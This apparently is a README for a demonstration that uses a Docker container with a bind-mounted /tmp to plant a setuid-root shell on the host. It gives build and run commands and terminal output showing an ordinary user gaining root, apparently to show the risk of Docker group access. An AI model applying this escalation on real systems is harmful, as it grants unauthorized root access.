# Use a container to create a setuid executable on the host

Build the C file into an executable, and then build the Dockerfile:

```
cc setuid-sh.c -lc -o setuid-sh
docker build -t setuid-sh -f setuid-sh.Dockerfile .
```

Run the container, mounting the host's `/tmp` directory into the container:

```
docker run -v /tmp:/tmp setuid-sh
```

This copies an executable called `sh` into the `/tmp` directory on your host, with the setuid bit set. 

```
liz@vm:~$ ls -l /tmp/sh
-rwsr-xr-x 1 root root 16008 May  8 14:25 /tmp/sh
```

Running this as a regular user will give you a shell on the host running as root.

```
liz@vm:~$ /tmp/sh
# whoami
root
```

Thanks to Ferry Boender for the inspiration in the post ["Root your Docker host in 10 seconds for fun and profit"](https://www.electricmonk.nl/log/2017/09/30/root-your-docker-host-in-10-seconds-for-fun-and-profit/)

